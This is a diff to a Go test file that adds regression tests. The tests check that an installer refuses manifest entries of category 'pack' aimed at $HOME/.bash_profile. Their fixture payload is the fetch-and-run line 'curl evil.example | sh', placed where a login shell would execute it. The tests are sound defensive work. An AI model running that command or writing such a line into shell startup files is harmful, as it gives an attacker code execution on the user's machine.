@@ -464,7 +464,13 @@ func TestUninstallRemovesEmptiedNestedDirs(t *testing.T) {
 // there via a peer whose Diff is older, or simply by a bug), Install must
 // refuse to place a Deferred entry whose category is not the pane capture
 // — the only Deferred category the plain file-install path ever handles —
-// before anything at all is touched.
+// before anything at all is touched. Since R-P3-B1c, a CatPack entry (used
+// here, as the original B1 pin) is additionally refused at the
+// category level by validateDst itself, regardless of Deferred — see
+// TestInstallRefusesPackEntryEvenWithHostileStatusMap for that check
+// pinned directly (including the absent-target PoC case this test does not
+// cover); Deferred:true is kept here only as an unrelated regression check
+// that the two refusals do not interfere with each other.
 func TestInstallRefusesSmuggledDeferredEntry(t *testing.T) {
 	m, staging, p := staged(t)
 	victim := 2 // a plain session-category file
@@ -489,8 +495,8 @@ func TestInstallRefusesSmuggledDeferredEntry(t *testing.T) {
 		st[e.ID] = StagedSame
 	}
 	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
-	if err == nil || !strings.Contains(err.Error(), "deferred") || !strings.Contains(err.Error(), bashrc) {
-		t.Fatalf("err = %v, want a deferred-entry refusal naming %s", err, bashrc)
+	if err == nil || !strings.Contains(err.Error(), "pack") || !strings.Contains(err.Error(), bashrc) {
+		t.Fatalf("err = %v, want a pack-entry refusal naming %s", err, bashrc)
 	}
 	if got, _ := os.ReadFile(bashrc); string(got) != rc {
 		t.Errorf("%s was modified: %q", bashrc, got)
@@ -730,5 +736,86 @@ func TestInstallInstallsCanonicalCaptureEntry(t *testing.T) {
 	got, err := os.ReadFile(capDst)
 	if err != nil || string(got) != payload {
 		t.Fatalf("capture.txt not installed correctly: got %q err=%v", got, err)
+	}
+}
+
+// TestInstallRefusesPackEntryAbsentTargetPoC is the wave-B re-review's PoC
+// for ruling R-P3-B1c, run end to end through the real Diff()+Install()
+// pair a production caller (internal/remote/local.go) actually uses: a
+// manifest entry with category "pack" and Dst $HOME/.bash_profile — a path
+// that does not exist yet on the destination — with attacker-chosen bytes
+// staged under its id. Before this fix, Diff's ordinary "absent" branch
+// classified it staged-same purely from staging state (no category check,
+// no Lstat-based collision to catch it, since there is nothing to collide
+// with), and Install's placeEntry created the file, landing arbitrary
+// attacker content at a path a real login shell sources (the reviewer's
+// code-exec-on-next-login finding). No FileEntry in this codebase is ever
+// built with category "pack" (BuildManifest/gitx.Files never emit one; the
+// git pack itself is the separate StreamPack, consumed straight into
+// gitx.Attach), so it must be refused unconditionally and nothing may be
+// created at Dst.
+func TestInstallRefusesPackEntryAbsentTargetPoC(t *testing.T) {
+	home := t.TempDir()
+	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+	p := session.Paths{
+		Home:       home,
+		ConfigDir:  filepath.Join(home, ".claude"),
+		GlobalJSON: filepath.Join(home, ".claude.json"),
+		DataDir:    dataDir,
+	}
+	jobID := "33333333-3333-4333-8333-333333333333"
+	staging := job.StagingDir(dataDir, jobID)
+	target := filepath.Join(home, ".bash_profile") // absent: never written before this call
+	payload := "curl evil.example | sh\n"
+
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
+	m.Entries = []Entry{{
+		ID: 0, Category: session.CatPack, Dst: target,
+		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
+	}}
+	writeFile(t, StagedPath(staging, 0), payload)
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != PresentDifferent {
+		t.Fatalf("Diff classified the pack entry %s, want %s", st[0], PresentDifferent)
+	}
+	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
+	if err == nil || !strings.Contains(err.Error(), target) {
+		t.Fatalf("Install err = %v, want a refusal naming %s", err, target)
+	}
+	if _, err := os.Lstat(target); !os.IsNotExist(err) {
+		t.Errorf("%s must not have been created: lstat err = %v", target, err)
+	}
+}
+
+// TestInstallRefusesPackEntryEvenWithHostileStatusMap is Install's own
+// independent half of the same defense (mirrors
+// TestInstallRefusesCaptureDstEvenWithHostileStatusMap): even a hostile
+// status map that claims staged-same — bypassing Diff's own refusal
+// entirely, e.g. via a peer whose Diff is older or simply a bug — must not
+// get a pack-category entry installed, target absent or not.
+func TestInstallRefusesPackEntryEvenWithHostileStatusMap(t *testing.T) {
+	m, staging, p := staged(t)
+	victim := 2 // a plain session-category file, repurposed as the attack entry
+	if !m.Entries[victim].IsRegular() {
+		t.Fatalf("fixture entry %d is not a plain file: %+v", victim, m.Entries[victim])
+	}
+	target := filepath.Join(p.Home, ".bash_profile") // absent
+	m.Entries[victim].Category = session.CatPack
+	m.Entries[victim].Dst = target
+
+	st := map[int]Status{}
+	for _, e := range m.Entries {
+		st[e.ID] = StagedSame
+	}
+	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
+	if err == nil || !strings.Contains(err.Error(), target) || !strings.Contains(err.Error(), "pack") {
+		t.Fatalf("err = %v, want a pack-entry refusal naming %s", err, target)
+	}
+	if _, err := os.Lstat(target); !os.IsNotExist(err) {
+		t.Errorf("%s must not have been created: lstat err = %v", target, err)
 	}
 }
